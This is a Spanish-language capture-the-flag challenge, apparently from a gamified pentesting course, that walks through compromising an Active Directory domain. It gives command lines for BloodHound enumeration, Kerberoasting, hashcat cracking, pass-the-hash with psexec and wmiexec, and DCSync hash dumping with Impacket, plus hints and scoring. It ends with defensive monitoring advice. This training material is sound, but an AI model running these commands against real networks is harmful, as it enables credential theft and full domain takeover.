# 🔴 Control de Red — Active Directory — 0xVK-003

```
CÓDIGO      : 0xVK-003
DIFICULTAD  : ██████████ EXPERTO
XP BASE     : 500 pts
FACULTAD    : 03 — Pentesting & Red Team
PRERREQUISITO: 0xVK-001 y 0xVK-002 completados, fundamentos de redes Windows
```

---

## 📡 Briefing

> *Lograste acceso inicial con un usuario de dominio de bajo privilegio. El servidor de identidad corporativa —un Domain Controller con Windows Server— controla todos los usuarios, equipos y políticas de la red. Tu misión: moverse lateralmente entre servidores, escalar privilegios y comprometer el Domain Controller para convertirte en Domain Admin. El control de la identidad es el control total.*

**Objetivo final (FLAG):** Ejecutar `secretsdump` o `dcsync` contra el Domain Controller y extraer el hash NTLM del administrador del dominio. La flag está dentro del hash.

---

## 🎯 Objetivos de aprendizaje

Al completar esta operación, el operador será capaz de:

- [ ] Enumerar un dominio de Active Directory con `BloodHound` y `SharpHound`
- [ ] Ejecutar Kerberoasting para obtener tickets de servicio crackeables
- [ ] Aplicar Pass-the-Hash (PtH) para movimiento lateral
- [ ] Ejecutar DCSync para volcar hashes del Domain Controller
- [ ] Entender la cadena completa de compromiso de un dominio
- [ ] Documentar la ruta de ataque con BloodHound y proponer remediaciones

---

## 🗺️ Fases de la operación

### FASE 1 — Enumeración del dominio

**Objetivo:** Mapear usuarios, grupos, ACLs y rutas de escalada dentro del dominio.

**Concepto clave — ¿Por qué AD es el objetivo principal?**
```
Active Directory es el sistema nervioso central de toda red corporativa.
Quien controla el DC controla:
  → Todos los usuarios y contraseñas del dominio
  → Todos los equipos y servidores
  → Todas las políticas de seguridad (GPO)
  → Todos los servicios críticos (DNS, LDAP, Kerberos)
```

**Tareas:**
1. Ejecuta SharpHound para recolectar datos del dominio:
   ```powershell
   # Desde el host comprometido con acceso de usuario de dominio
   .\SharpHound.exe -c All --outputdirectory C:\temp\
   ```
2. Importa los datos en BloodHound y analiza:
   - Caminos más cortos hacia Domain Admin
   - Usuarios con SPNs configurados (objetivos de Kerberoasting)
   - ACLs mal configuradas
   - Grupos con privilegios excesivos
3. Enumera también con herramientas nativas:
   ```powershell
   net user /domain
   net group "Domain Admins" /domain
   Get-ADUser -Filter * -Properties ServicePrincipalName | Where-Object {$_.ServicePrincipalName -ne $null}
   ```

**Checkpoint 1:** ¿Cuántos usuarios tienen SPNs configurados? ¿Cuál es el camino más corto a DA en BloodHound?

---

### FASE 2 — Kerberoasting y movimiento lateral

**Objetivo:** Obtener credenciales válidas de cuentas de servicio y moverse lateralmente.

**Concepto clave — Kerberoasting:**
```
Cualquier usuario de dominio puede solicitar un TGS (Ticket Granting Service)
para cualquier cuenta con SPN. El ticket viene cifrado con el hash NTLM
de la cuenta de servicio. Si la contraseña es débil, se puede crackear offline.
```

**Tareas:**
1. Solicita tickets Kerberos de las cuentas de servicio:
   ```bash
   # Con Impacket desde Linux
   python3 GetUserSPNs.py <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DC_IP> -request
   
   # Guarda el hash en un archivo
   python3 GetUserSPNs.py <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DC_IP> -request -outputfile hashes.kerberoast
   ```
2. Crackea el hash offline con Hashcat:
   ```bash
   hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force
   ```
3. Con la nueva contraseña, verifica acceso a otros sistemas:
   ```bash
   crackmapexec smb <NETWORK_RANGE> -u <SVC_USER> -p <PASSWORD>
   ```
4. Si encuentras un servidor accesible, aplica Pass-the-Hash:
   ```bash
   # Extrae el hash NTLM del servidor comprometido
   python3 secretsdump.py <DOMAIN>/<USER>:<PASS>@<TARGET_IP>
   
   # Úsalo para autenticarte en otro servidor
   python3 psexec.py -hashes :<NTLM_HASH> Administrator@<NEXT_TARGET>
   ```

**Checkpoint 2:** ¿Qué cuenta de servicio pudiste comprometer? ¿A qué sistemas tiene acceso?

---

### FASE 3 — DCSync y compromiso total del dominio

**Objetivo:** Comprometer el Domain Controller y extraer todos los hashes del dominio.

**Concepto clave — DCSync:**
```
DCSync abusa de los privilegios de replicación de Active Directory.
Los Domain Controllers se replican entre sí los cambios de NTDS.dit.
Si una cuenta tiene el privilegio DS-Replication-Get-Changes-All,
puede solicitar esa replicación y recibir todos los hashes del dominio.
```

**Tareas:**
1. Verifica si la cuenta comprometida tiene privilegios de replicación:
   ```powershell
   # Con PowerView
   Get-DomainObjectAcl -Identity "DC=domain,DC=local" -ResolveGUIDs | \
     Where-Object {$_.ActiveDirectoryRights -match "DS-Replication"}
   ```
2. Ejecuta DCSync con Impacket:
   ```bash
   python3 secretsdump.py -just-dc <DOMAIN>/<USER>@<DC_IP>
   ```
3. Si no tienes privilegios directos, busca vías alternativas en BloodHound:
   - WriteDACL sobre el dominio
   - GenericAll sobre una cuenta con privilegios
   - ACL abuse con `Add-DomainObjectAcl`
4. Con el hash del Domain Admin, confirma el acceso total:
   ```bash
   python3 wmiexec.py -hashes :<DA_HASH> Administrator@<DC_IP>
   # whoami → debe devolver DOMAIN\Administrator
   ```

**Checkpoint 3:** ¿Cuántos hashes extrajiste del DC? ¿Tienes el hash de `krbtgt`?

---

## 🚩 Entrega de la FLAG

Formato esperado:
```
0xVKRAD{DA_PWNED_<hash_parcial_krbtgt>}
```

---

## 💡 Hints disponibles (costo: -20 XP cada uno)

<details>
<summary>Hint 1 — Cuenta de servicio débil</summary>

Hay un servicio `MSSQL` corriendo en el dominio con una cuenta de servicio. Su contraseña es una palabra del diccionario `rockyou.txt`. Filtra por SPNs que contengan `MSSQLSvc`.
</details>

<details>
<summary>Hint 2 — Ruta de escalada</summary>

La cuenta de servicio comprometida es miembro de un grupo local de administradores en el servidor `SRV-BACKUP`. Desde ahí puedes volcar el LSA y encontrar credenciales en caché de un Domain Admin que inició sesión recientemente.
</details>

<details>
<summary>Hint 3 — Privilegios de replicación</summary>

El Domain Admin cuyo hash encontraste en el servidor de backup SÍ tiene privilegios DS-Replication. Usa su hash directamente con Impacket secretsdump sin necesidad de crackear la contraseña (Pass-the-Hash).
</details>

---

## 🏅 Puntuación

| Logro | XP |
|---|---|
| Completar la misión | 500 |
| Primera resolución del día | +20 |
| Sin usar hints | +60 |
| Extracción del hash `krbtgt` | +80 |
| Writeup con BloodHound screenshots | +50 |
| Propuesta de remediación completa | +40 |
| **Total máximo** | **750** |

---

## 🔬 Lección técnica

> El 90% de los compromisos de Active Directory en el mundo real siguen esta cadena: **reconocimiento → Kerberoasting → movimiento lateral → DCSync**. La defensa no es solo parchear: es aplicar el principio de mínimo privilegio en SPNs, tiered admin model, Protected Users group y monitoreo de eventos 4769 (TGS-REQ) y 4662 (replicación).

```
Eventos críticos a monitorear:
  4769 → Solicitud de ticket Kerberos (Kerberoasting)
  4625 → Intento de login fallido (fuerza bruta)
  4662 → Acceso a objeto AD (DCSync)
  4648 → Login con credenciales explícitas (PtH)
```

---

*Operación clasificada. Entorno controlado y simulado. Uso exclusivo educativo.*
